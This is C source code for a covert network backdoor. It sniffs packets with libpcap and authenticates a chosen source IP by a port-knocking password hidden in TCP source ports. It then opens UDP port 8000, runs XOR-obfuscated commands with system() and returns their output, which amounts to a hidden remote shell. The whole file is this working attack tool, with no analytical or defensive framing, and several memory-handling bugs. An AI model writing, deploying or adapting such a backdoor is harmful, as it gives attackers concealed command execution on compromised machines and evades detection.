#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

void reset_sequence(int *password_check[], int size);
int authenticate(const struct tcphdr *tcp, int **password_check, const int pass_size, const char *password);
void perform_backdoor_duties(const char * src_addr);

int execute_server(const char *password, const char *src_addr)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	const u_char *packet;
	int auth;
	struct pcap_pkthdr pkt_hdr;
	int pass_size = (int)(sizeof(char)*strlen(password));
	int *password_check = malloc(sizeof(int) * pass_size);
	pcap_t* nic_descr;
	struct iphdr *the_ip;
	struct tcphdr *tcp;
	struct in_addr ip_addr;
	reset_sequence(&password_check, pass_size);
	
	nic_descr = pcap_open_live ("em1", BUFSIZ, 0, -1, errbuf);
	while(1)
	{
		packet = pcap_next(nic_descr, &pkt_hdr);
		
		if(packet == NULL)
			continue;
		
		the_ip = (struct iphdr*) (packet + sizeof(struct ether_header));
		tcp = (struct tcphdr*) (packet + sizeof(struct ether_header) + sizeof(struct iphdr));
		
		ip_addr.s_addr =  the_ip->saddr;
		if(strcmp(inet_ntoa(ip_addr), src_addr) != 0)
			continue;

		auth = authenticate(tcp, &password_check, pass_size, password);
		if(auth == 0)
		{
			printf("return 0\n");
			reset_sequence(&password_check, pass_size);
			continue;
		}
		else if(auth == 1)
		{
			printf("return 1\n");
			continue;
		}
		
		printf("Auth comeplete\n");
		
		perform_backdoor_duties(src_addr);

		reset_sequence(&password_check, pass_size);
	}
	
	return 0;
}

void perform_backdoor_duties(const char * src_addr)
{
	FILE *file; 
	int sockfd,n,i;
	struct sockaddr_in servaddr,cliaddr;
	socklen_t len;
	char mesg[1000];
	char *decrypted, *encrypted, *bash;
   	sockfd=socket(AF_INET,SOCK_DGRAM,0);

   	bzero(&servaddr,sizeof(servaddr));
   	servaddr.sin_family = AF_INET;
   	servaddr.sin_addr.s_addr=htonl(INADDR_ANY);
   	servaddr.sin_port=htons(8000);
   	bind(sockfd,(struct sockaddr *)&servaddr,sizeof(servaddr));

  	for (;;)
   	{
      		len = sizeof(cliaddr);
      		n = recvfrom(sockfd,mesg,1000,0,(struct sockaddr *)&cliaddr,&len);		
		decrypted = malloc(n);
		for( i = 0; i < n; i++)
			decrypted[i] = mesg[i] ^ 2;
		printf("de %s\n", decrypted);
		bash = malloc(sizeof(decrypted) + sizeof(" > output.txt"));		

		strcat(bash, decrypted);
		strncpy(bash + strlen(decrypted) - 1, " > output.txt\0", 13);
		printf("%s\n", bash);
		system(bash);
		file = fopen ("output.txt", "rt");
		bzero(mesg, 1000);
		while(fgets(mesg, 1000, file) != NULL)
		{
			encrypted = malloc(sizeof(mesg));
			for( i = 0; i < sizeof(mesg); i++)
				encrypted[i] = mesg[i] ^ 2;
			sendto(sockfd,encrypted,sizeof(mesg),0,(struct sockaddr *)&cliaddr,sizeof(cliaddr));
		}	

      		
   }
}

int authenticate(const struct tcphdr *tcp, int **password_check, const int pass_size, const char *password)
{
	int i;
	int inc_char = -1; 
	
	inc_char = (ntohs(tcp->source) ^ 1080);
	if(inc_char == -1)
		return 0;

	for(i = 0; i < pass_size; i++)
	{
		if((*password_check)[i] == 1)
			continue;
		if((*password_check)[i] == 0 && password[i] == inc_char) 
		{
			printf("GOT CHARACTER %d\n", i);
			(*password_check)[i] = 1;
			if(i == pass_size - 1)
				return 2;
			else
				return 1;
		}
		else
		{
			return 0;
		}
	}
	return 0;
}

void reset_sequence(int ** password_check, int size)
{
	int i;
	for(i = 0; i < size; i++)
		(*password_check)[i] = 0;
}
